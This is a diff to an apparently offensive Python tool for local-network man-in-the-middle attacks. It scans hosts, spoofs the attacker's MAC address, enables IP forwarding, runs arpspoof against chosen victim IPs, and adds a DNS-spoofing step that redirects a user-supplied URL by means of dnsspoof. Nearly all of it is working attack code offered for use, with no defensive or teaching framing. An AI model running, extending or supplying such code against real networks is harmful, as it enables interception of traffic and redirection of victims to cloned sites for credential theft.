@@ -9,9 +9,15 @@ from prettytable import PrettyTable
 from netaddr import IPAddress
 from scapy.all import ARP, Ether, srp
 import threading
+from uuid import uuid4
+from django.forms import URLField
+from django.core.exceptions import ValidationError
 
 J = False
 choice_scan = None
+choice_dns = None
+choice_mac = None
+url = None
 
 class color:
     PURPLE = '\033[95m'
@@ -97,6 +103,13 @@ def get_ssid():
         print(color.GREEN+"[+] ESSID: "+color.YELLOW+essid+color.END)
     except:
         print(color.RED+"[-] An error has occured during fetching ESSID"+color.END)
+        
+def getmac(interface):
+    try:
+        mac = open('/sys/class/net/'+interface+'/address').readline()
+    except:
+        mac = "00:00:00:00:00:00"
+    return mac[0:17]
 
 def scan_network():
     global ip_dict, all
@@ -126,9 +139,19 @@ def scan_network():
 def target():
     global choice_ip, all
     if len(ip_dict) > 0:
-        print("\n[0] : "+"All"+color.GREEN+"\n[R] : "+"Rescan Network"+color.PURPLE+"\n[M] : "+"Restore MAC Address and Scan Network"+color.RED+"\n[E] : "+"Exit"+color.CYAN+"\n\nChoose an IP to spoof, rescan or exit"+color.END)
+        print("\n[0] : "+"All"+color.GREEN)
+        print("[R] : "+"Rescan Network"+color.PURPLE)
+        if getmac(interface) != mac_og:
+            print("[M] : "+"Restore MAC Address and Scan Network"+color.RED)
+        print("[E] : "+"Exit"+color.CYAN)
+        print("\nChoose an IP to spoof, rescan or exit"+color.END)
     else:
-        print(color.GREEN+"\n[R] : "+"Rescan Network"+color.PURPLE+"\n[M] : "+"Restore MAC Address and Scan Network"+color.RED+"\n[E] : "+"Exit"+color.CYAN+"\n\nIt looks like no hosts were found in the scanning session.\nYou can Rescan the network while maintaining a fake MAC address or restore your real MAC Address and Rescan the network."+color.END)
+        print(color.GREEN+"\n[R] : "+"Rescan Network"+color.PURPLE)
+        if getmac(interface) != mac_og:
+            print("[M] : "+"Restore MAC Address and Scan Network"+color.RED)
+        print("[E] : "+"Exit"+color.CYAN)
+        if getmac(interface) != mac_og:
+            print("\nIt looks like no hosts were found in the scanning session.\nYou can Rescan the network while maintaining a fake MAC address or restore your real MAC Address and Rescan the network."+color.END)
     choice_ip = ""
     while not set(choice_ip.split(" ")).issubset({str(key) for key in ip_dict.keys()}) and choice_ip != "R" and choice_ip != "E" and choice_ip != "0" and choice_ip != "M":
         choice_ip = input("Choice: ")
@@ -154,25 +177,28 @@ def target():
             sys.exit(color.RED+"[-] An error has occured\n Exiting..."+color.END)
 
 # Enable Redirect
-def redirect():
-    cmd = 'echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward'
-    print(color.BLUE+"\n[~] Enabling forwarding..."+color.END)
+def redirect(value):
+    cmd = 'echo '+str(value)+' | sudo tee /proc/sys/net/ipv4/ip_forward'
+    if value == 1:
+        print(color.BLUE+"\n[~] Enabling forwarding..."+color.END)
+    else:
+        print(color.BLUE+"\n[~] Disabling forwarding..."+color.END)
     try:
         subprocess.check_output(cmd, shell=True).decode()
     except subprocess.CalledProcessError:
-        print(color.RED+"[-] Couldn't enable forwarding"+color.END)
+        print(color.RED+"[-] Couldn't enable or disable forwarding"+color.END)
         reset_mac()
         sys.exit(color.RED+"Exiting..."+color.END)
 
 # ARPSpoof
 def arpspoof(ip1,ip2,pos):
-    subprocess.run(['xterm', '-geometry', '110x24'+str(pos)+'0+0', '-hold', '-e', 'arpspoof', '-t', ip1, ip2, '-i', interface])
+    subprocess.Popen(['xterm', '-geometry', '110x24'+str(pos)+'0+0', '-hold', '-e', 'arpspoof', '-t', ip1, ip2, '-i', interface])
 
 # Attack thread
 def attck_thread():
-    global J
+    global J, choice_dns
     threads = []
-    print(color.BLUE+"[~] Starting Attack..."+color.END)
+    print(color.BLUE+"[~] Arpspoofing..."+color.END)
     J = True
     if all:
         if len(ip_dict) > 0:
@@ -185,6 +211,13 @@ def attck_thread():
                 i.start()
             for i in threads:
                 i.join()
+            while choice_dns != "Y" and choice_dns != "N" and choice_dns != "n" and choice_dns != "y":
+                choice_dns = input("Start DNS Spoofing? (Y/N): ")
+            if choice_dns == "Y" or choice_dns == "y":
+                get_url()
+                create_file()
+                dnsspoof()
+                
         else:
             print(color.RED+"[-] No devices available to spoof"+color.END)
             reset_mac()
@@ -199,26 +232,41 @@ def attck_thread():
             i.start()
         for i in threads:
             i.join()
+        while choice_dns != "Y" and choice_dns != "N" and choice_dns != "n" and choice_dns != "y":
+            choice_dns = input("Start DNS Spoofing? (Y/N): ")
+        if choice_dns == "Y" or choice_dns == "y":
+            get_url()
+            create_file()
+            print(color.BLUE+"[~] DNSspoofing..."+color.END)
+            dnsspoof()
 
 # Get URL
 def get_url():
     global url 
-    try:
+    while not url_valid():
         url = input("URL to be cloned: ")
-    except:
-        sys.exit()
 
+def url_valid():
+    global url
+    url_form_field = URLField()
+    try:
+        url_form_field.clean(url)
+    except ValidationError:
+        return False
+    return True
+    
 # Create DNS file
 def create_file():
     global dns_file
-    dns_file = 'dns_file'
+    dns_file = '/tmp/dns_file'+str(uuid4())
+    print(color.BLUE+"[~] Creating DNS file..."+color.END)
     with open(dns_file, 'w') as file:
         file.write(url+'\tlocalhost\nlocalhost\t'+url+'\n')
     file.close()
 
 # DNSSpoof
-def dnsspoof(file):
-    subprocess.run(['xterm', '-geometry', '110x24+0-0', '-hold', '-e', 'dnsspoof', '-f', file, '-i', interface])
+def dnsspoof():
+    subprocess.run(['xterm', '-geometry', '110x24+0-0', '-hold', '-e', 'dnsspoof', '-f', dns_file, '-i', interface])
 
 
 banner = '''
@@ -238,11 +286,16 @@ try:
     print(color.BLUE+"[~] Fetching info..."+color.END)
     time.sleep(1)
     get_interface()
+    mac_og = getmac(interface)
+    print(color.GREEN+"[+] MAC: "+color.YELLOW+mac_og+color.END)
     get_gateway()
     get_netmask()
     get_ssid()
-    change_mac()
-    time.sleep(5)
+    while choice_mac != "Y" and choice_mac != "N" and choice_mac != "n" and choice_mac != "y":
+        choice_mac = input("Change MAC? (Y/N): ")
+    if choice_mac == "Y" or choice_mac == "y":
+        change_mac()
+        time.sleep(5)
     while choice_scan != "Y" and choice_scan != "N" and choice_scan != "n" and choice_scan != "y":
         choice_scan = input("Start Scan? (Y/N): ")
     if choice_scan == "Y" or choice_scan == "y":
@@ -251,16 +304,17 @@ try:
         reset_mac()
         sys.exit(color.RED+"Exiting..."+color.END)
     target()
-    redirect()
+    redirect(1)
     attck_thread()
-    
     print(color.GREEN+"\n[+] Job Done...\n"+color.END)
+    redirect(0)
     reset_mac()
 except KeyboardInterrupt as k:
     if J:
         print(color.GREEN+"\n[+] Job Done...\n"+color.END)
     else:
         print(color.RED+"\n[-] Keyboard Interrupt"+color.END)
+    redirect(0)
     reset_mac()
     sys.exit(color.RED+"Exiting..."+color.END)
 
